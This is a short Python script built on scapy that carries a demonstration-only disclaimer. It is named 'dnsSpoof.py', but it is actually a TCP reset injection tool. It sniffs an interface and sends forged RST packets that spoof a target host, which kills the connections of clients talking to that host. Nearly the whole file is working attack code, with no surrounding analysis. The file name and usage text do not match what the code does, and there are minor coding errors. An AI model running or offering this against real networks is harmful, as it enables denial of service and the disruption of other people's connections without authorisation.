#!/usr/bin/env python
# This code is strictly for demonstration purposes.
# If used in any other way or for any other purposes. In no way am I responsible
# for your actions or any damage which may occur as a result of its usage
# dnsSpoof.py
# Author: Nik Alleyne - nikalleyne at gmail dot com
# http://securitynik.blogspot.com

from sys import argv, exit
from scapy.all import *

host = sys.argv[2]

def usage():
    print("[*]Usage: python sniffer.py [network interface] [host]")
    
def scan(packet):
    return
                
def main():
    global host
    print "Beginning to sniff on " + argv[1]
    while 1:
        packet = sniff(iface=argv[1], prn=scan, filter="", count=1)[0]
        if packet.haslayer(TCP):
            if packet.haslayer(IP):
                IPsrc = packet.getlayer(IP).src
                IPdst = packet.getlayer(IP).dst
                srcPort = packet.getlayer(TCP).sport
                dstPort = packet.getlayer(TCP).dport
                print "Found SEQ " + str(packet.getlayer(TCP).seq) +" ACK " + str(packet.getlayer(TCP).ack)
                if IPdst == host:
                    seq = packet.getlayer(TCP).seq
                    ack = packet.getlayer(TCP).ack
                    print "Sending RST packet to " + IPsrc +" with seq " + str(seq) +" and ack " + str(ack)
                    rst_pkt = Ether()/IP(src=IPdst, dst=IPsrc)/TCP(sport=dstPort, dport=srcPort, flags="R", seq=ack,ack=0)
                    sendp(rst_pkt,iface=sys.argv[1])
                    rst_pkt = Ether()/IP(src=IPdst, dst=IPsrc)/TCP(sport=dstPort, dport=srcPort, flags="R", seq=ack+200,ack=0)
                    sendp(rst_pkt,iface=sys.argv[1])
                    rst_pkt = Ether()/IP(src=IPdst, dst=IPsrc)/TCP(sport=dstPort, dport=srcPort, flags="R", seq=ack+500,ack=0)
                    sendp(rst_pkt,iface=sys.argv[1])

if len(sys.argv) < 3:
    usage()
    exit(0)

if __name__ == '__main__':
    main()
